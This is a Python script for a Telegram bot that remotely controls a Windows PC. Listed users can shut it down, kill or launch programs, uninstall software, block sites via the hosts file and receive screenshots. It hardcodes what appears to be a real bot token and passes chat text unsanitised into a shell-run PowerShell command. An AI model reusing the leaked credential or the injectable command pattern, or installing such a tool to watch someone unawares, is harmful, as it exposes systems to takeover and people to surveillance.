import os
import time
import threading
import subprocess
import psutil
import pyautogui
import telebot
from ping3 import ping
import schedule
import tkinter as tk
from telebot import types

# Инициализация
TOKEN = "6499829716:AAEqFEQo3ka89Jkx7Tz5_fjyl39-PivOGZk"
bot = telebot.TeleBot(TOKEN)
AUTHORIZED_USERS = {"1618420100", "5692442914", "1614938486"}
blacklisted_apps = {""}
blocked_sites = {""}

HOSTS_PATH = r"C:\\Windows\\System32\\drivers\\etc\\hosts"
REDIRECT_IP = "127.0.0.1"

# Блокировка сайтов
def block_sites():
    with open(HOSTS_PATH, "r+") as file:
        content = file.read()
        for site in blocked_sites:
            if site not in content:
                file.write(f"{REDIRECT_IP} {site}\n")

# Разблокировка сайтов
def unblock_sites():
    with open(HOSTS_PATH, "r") as file:
        lines = file.readlines()
    with open(HOSTS_PATH, "w") as file:
        for line in lines:
            if not any(site in line for site in blocked_sites):
                file.write(line)

# Добавление сайта в блок-лист
def add_to_blocked_sites(site):
    blocked_sites.add(site.lower())
    block_sites()

# Удаление сайта из блок-листа
def remove_from_blocked_sites(site):
    blocked_sites.discard(site.lower())
    unblock_sites()

# Проверка интернет-соединения
def is_connected():
    try:
        return ping("8.8.8.8", timeout=2) is not None
    except:
        return False

# Функции управления системой
def shutdown():
    os.system("shutdown /s /t 5")

def reboot():
    os.system("shutdown /r /t 5")

def list_running_apps():
    return [proc.name() for proc in psutil.process_iter(['name'])]

def kill_app(app_name):
    app_name = app_name.lower().strip()
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() == app_name:
            proc.kill()

def open_app(path):
    subprocess.Popen(path)

def display_message(message):
    def show():
        root = tk.Tk()
        root.title("Сообщение:")
        label = tk.Label(root, text=message, padx=20, pady=20)
        label.pack()
        root.after(35000, root.destroy)
        root.mainloop()
    threading.Thread(target=show).start()

def uninstall_app(app_name):
    command = f'powershell "Get-WmiObject -Class Win32_Product | Where-Object {{$_.Name -eq \"{app_name}\"}} | ForEach-Object {{$_.Uninstall()}}"'
    subprocess.run(command, shell=True)

# Мониторинг нежелательных приложений
def monitor_blacklisted_apps():
    while True:
        for proc in psutil.process_iter(['name']):
            name = proc.info['name']
            if name and name.lower() in {app.lower() for app in blacklisted_apps}:
                proc.kill()
        time.sleep(5)

def make_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        save_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(save_path)
        return save_path
    except Exception as e:
        print(f"Ошибка при создании скриншота: {e}")
        return None

# Обработка команд
@bot.message_handler(commands=['start'])
def handle_start(message):
    if str(message.from_user.id) in AUTHORIZED_USERS:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row("Выключить", "Перезагрузить")
        markup.row("Программы", "Скриншот")
        markup.row("Сообщение Привет!", "Открыть notepad.exe")
        markup.row("Закрыть notepad.exe", "Удалить SomeApp")
        markup.row("Добавить сайт в блок-лист", "Удалить сайт из блок-листа")
        markup.row("Разблокировать сайты")
        bot.send_message(message.chat.id, "Бот запущен. Выберите команду:", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "Доступ запрещен.")

@bot.message_handler(func=lambda message: True)
def handle_commands(message):
    if str(message.from_user.id) not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "Доступ запрещен.")
        return

    cmd = message.text.lower()

    if cmd == "выключить":
        bot.send_message(message.chat.id, "Выключение через 5 секунд.")
        shutdown()
    elif cmd == "перезагрузить":
        bot.send_message(message.chat.id, "Перезагрузка через 5 секунд.")
        reboot()
    elif cmd == "программы":
        apps = list_running_apps()
        bot.send_message(message.chat.id, "Запущенные приложения:\n" + "\n".join(apps))
    elif cmd.startswith("закрыть "):
        app = cmd.replace("закрыть ", "")
        kill_app(app)
        bot.send_message(message.chat.id, f"{app} закрыт.")
    elif cmd.startswith("открыть "):
        path = cmd.replace("открыть ", "")
        open_app(path)
        bot.send_message(message.chat.id, f"{path} запущен.")
    elif cmd.startswith("сообщение "):
        msg = cmd.replace("сообщение ", "")
        display_message(msg)
        bot.send_message(message.chat.id, "Сообщение отображено.")
    elif cmd.startswith("удалить "):
        app = cmd.replace("удалить ", "")
        uninstall_app(app)
        bot.send_message(message.chat.id, f"{app} удален.")
    elif cmd == "скриншот":
        screenshot_path = make_screenshot()
        if screenshot_path:
            with open(screenshot_path, "rb") as img:
                bot.send_document(message.chat.id, img)
            os.remove(screenshot_path)
        else:
            bot.send_message(message.chat.id, "Не удалось сделать скриншот.")
    elif cmd.startswith("добавить сайт "):
        site = cmd.replace("добавить сайт ", "")
        add_to_blocked_sites(site)
        bot.send_message(message.chat.id, f"Сайт {site} добавлен в блок-лист.")
    elif cmd.startswith("удалить сайт "):
        site = cmd.replace("удалить сайт ", "")
        remove_from_blocked_sites(site)
        bot.send_message(message.chat.id, f"Сайт {site} удален из блок-листа.")
    elif cmd == "разблокировать сайты":
        unblock_sites()
        bot.send_message(message.chat.id, "Сайты разблокированы.")
    else:
        bot.send_message(message.chat.id, "Неизвестная команда.")

# Уведомление о запуске
def notify_startup():
    for user_id in AUTHORIZED_USERS:
        bot.send_message(user_id, "Компьютер включен.")

# Планирование задач
schedule.every().day.at("09:00").do(notify_startup)

# Запуск планировщика
def run_scheduler():
    while True:
        schedule.run_pending()
        time.sleep(1)

# Безопасный polling с авто-перезапуском
def safe_polling():
    while True:
        if not is_connected():
            print("[!] Нет интернета. Ожидание подключения...")
            time.sleep(5)
            continue
        try:
            print("[*] Запуск polling...")
            bot.infinity_polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"[!] Ошибка polling: {e}. Перезапуск через 10 секунд...")
            time.sleep(10)

# Запуск
if __name__ == "__main__":
    notify_startup()
    block_sites()
    threading.Thread(target=monitor_blacklisted_apps, daemon=True).start()
    threading.Thread(target=run_scheduler, daemon=True).start()
    safe_polling()
